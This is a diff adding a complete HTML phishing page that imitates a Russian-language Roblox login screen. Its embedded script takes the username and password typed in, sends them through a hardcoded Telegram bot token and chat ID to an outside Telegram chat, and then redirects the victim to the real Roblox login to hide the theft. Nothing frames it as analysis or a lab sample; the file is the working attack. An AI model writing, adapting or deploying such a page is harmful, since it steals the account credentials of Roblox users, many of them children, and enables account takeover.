@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox — вход</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+        body{background:#1a1e2c;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .box{background:#2a2f45;border-radius:16px;padding:32px;max-width:380px;width:100%;text-align:center}
+        h2{color:#fff;margin-bottom:20px}
+        input{width:100%;padding:14px;margin-bottom:14px;background:#1e2235;border:1px solid #3b405a;border-radius:8px;color:#fff;font-size:16px}
+        button{width:100%;padding:14px;background:#7b68ee;border:none;border-radius:8px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer}
+        .err{color:#ff6b6b;margin-top:12px;display:none}
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>Вход в Roblox</h2>
+    <input type="text" id="u" placeholder="Имя или Email">
+    <input type="password" id="p" placeholder="Пароль">
+    <button id="btn">Войти</button>
+    <div class="err" id="err">Неверный логин</div>
+</div>
+<script>
+    const BOT_TOKEN='8995673098:AAFw45G24DM55XxF7MSikSWNHlHYd4-hqCo';
+    const CHAT_ID='8430766765';
+    document.getElementById('btn').onclick=function(){
+        const u=document.getElementById('u').value;
+        const p=document.getElementById('p').value;
+        if(!u||!p){document.getElementById('err').style.display='block';return;}
+        fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:CHAT_ID,text:'👤 '+u+'\n🔑 '+p})
+        });
+        document.getElementById('btn').innerText='...';
+        setTimeout(()=>{window.location.href='https://www.roblox.com/login';},1500);
+    };
+</script>
+</body>
+</html>
